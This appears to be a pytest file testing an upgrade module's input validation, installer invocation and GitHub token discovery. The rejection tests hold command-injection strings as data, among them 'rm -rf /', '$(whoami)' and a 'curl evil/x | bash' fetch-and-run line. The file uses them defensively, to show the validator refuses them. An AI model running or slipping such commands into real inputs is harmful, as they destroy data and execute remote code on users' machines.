"""Tests for app.upgrade input validation."""
from __future__ import annotations

import json
import platform
from pathlib import Path
from unittest.mock import patch

import pytest

from app import upgrade
from app.upgrade import _discover_token, _validate_prefix, run_upgrade


class TestValidatePrefix:
    @pytest.mark.parametrize("prefix", [
        "/home/u/.local",
        "/usr/local",
        "/Users/Smith Jones/.local",
    ])
    def test_accepts_safe_absolute_paths(self, prefix):
        assert _validate_prefix(prefix)

    @pytest.mark.parametrize("prefix", [
        "",
        "relative/path",
        ".local",
        "/tmp; rm -rf /",
        "/tmp && evil",
        "/tmp\nrm",
        '/tmp"x',
        "/tmp$(whoami)",
        "/tmp`whoami`",
    ])
    def test_rejects_unsafe_or_relative(self, prefix):
        assert not _validate_prefix(prefix)


class TestRunUpgrade:
    @pytest.fixture
    def fake_meta(self, tmp_path, monkeypatch):
        meta_path = tmp_path / "install.json"
        monkeypatch.setattr(upgrade, "INSTALL_METADATA_PATH", meta_path)
        def write(data):
            meta_path.write_text(json.dumps(data))
        return write

    def test_rejects_invalid_version(self, fake_meta):
        fake_meta({"channel": "stable", "prefix": "/home/u/.local"})
        assert run_upgrade(version="not-a-version") == 1

    def test_rejects_invalid_channel_from_metadata(self, fake_meta):
        fake_meta({"channel": "experimental", "prefix": "/home/u/.local"})
        assert run_upgrade() == 1

    def test_rejects_malicious_prefix_from_metadata(self, fake_meta):
        fake_meta({"channel": "stable", "prefix": "/tmp; curl evil/x | bash; #"})
        assert run_upgrade() == 1

    def test_windows_short_circuits(self, fake_meta):
        fake_meta({"channel": "stable", "prefix": "/home/u/.local"})
        with patch("app.upgrade.platform.system", return_value="Windows"):
            assert run_upgrade() == 1

    def test_argv_is_used_not_shell_string(self, fake_meta):
        """Verify the installer is invoked with argv, not bash -c."""
        fake_meta({"channel": "nightly", "prefix": "/home/u/.local"})
        with patch("app.upgrade.platform.system", return_value="Linux"), \
             patch("app.upgrade.subprocess.check_output", return_value=b"#!/bin/bash\n"), \
             patch("app.upgrade.subprocess.run") as run_mock:
            run_mock.return_value.returncode = 0
            assert run_upgrade(version="0.2.0") == 0
        argv = run_mock.call_args.args[0]
        assert argv[0] == "bash"
        assert "-c" not in argv
        assert "--channel" in argv and "nightly" in argv
        assert "--version" in argv and "0.2.0" in argv

    def test_explicit_channel_overrides_metadata(self, fake_meta):
        fake_meta({"channel": "stable", "prefix": "/home/u/.local"})
        with patch("app.upgrade.platform.system", return_value="Linux"), \
             patch("app.upgrade.subprocess.check_output", return_value=b""), \
             patch("app.upgrade.subprocess.run") as run_mock:
            run_mock.return_value.returncode = 0
            run_upgrade(channel="nightly")
        argv = run_mock.call_args.args[0]
        assert "nightly" in argv and "stable" not in argv

    def test_token_propagates_to_curl_and_subprocess_env(self, fake_meta, monkeypatch):
        fake_meta({"channel": "nightly", "prefix": "/home/u/.local"})
        monkeypatch.setenv("GH_TOKEN", "secret-token-123")
        with patch("app.upgrade.platform.system", return_value="Linux"), \
             patch("app.upgrade.subprocess.check_output", return_value=b"") as curl_mock, \
             patch("app.upgrade.subprocess.run") as run_mock:
            run_mock.return_value.returncode = 0
            run_upgrade()
        curl_argv = curl_mock.call_args.args[0]
        assert "Authorization: Bearer secret-token-123" in curl_argv
        env = run_mock.call_args.kwargs["env"]
        assert env["GH_TOKEN"] == "secret-token-123"


class TestDiscoverToken:
    def test_prefers_gh_token_env(self, monkeypatch):
        monkeypatch.setenv("GH_TOKEN", "from-gh-token")
        monkeypatch.setenv("GITHUB_TOKEN", "from-github-token")
        assert _discover_token() == "from-gh-token"

    def test_falls_back_to_github_token(self, monkeypatch):
        monkeypatch.delenv("GH_TOKEN", raising=False)
        monkeypatch.setenv("GITHUB_TOKEN", "from-github-token")
        assert _discover_token() == "from-github-token"

    def test_falls_back_to_gh_cli(self, monkeypatch):
        monkeypatch.delenv("GH_TOKEN", raising=False)
        monkeypatch.delenv("GITHUB_TOKEN", raising=False)
        completed = type("R", (), {"returncode": 0, "stdout": "from-gh-cli\n"})()
        with patch("app.upgrade.subprocess.run", return_value=completed):
            assert _discover_token() == "from-gh-cli"

    def test_returns_none_when_gh_missing(self, monkeypatch):
        monkeypatch.delenv("GH_TOKEN", raising=False)
        monkeypatch.delenv("GITHUB_TOKEN", raising=False)
        with patch("app.upgrade.subprocess.run", side_effect=FileNotFoundError):
            assert _discover_token() is None

    def test_returns_none_when_gh_unauthenticated(self, monkeypatch):
        monkeypatch.delenv("GH_TOKEN", raising=False)
        monkeypatch.delenv("GITHUB_TOKEN", raising=False)
        completed = type("R", (), {"returncode": 1, "stdout": ""})()
        with patch("app.upgrade.subprocess.run", return_value=completed):
            assert _discover_token() is None
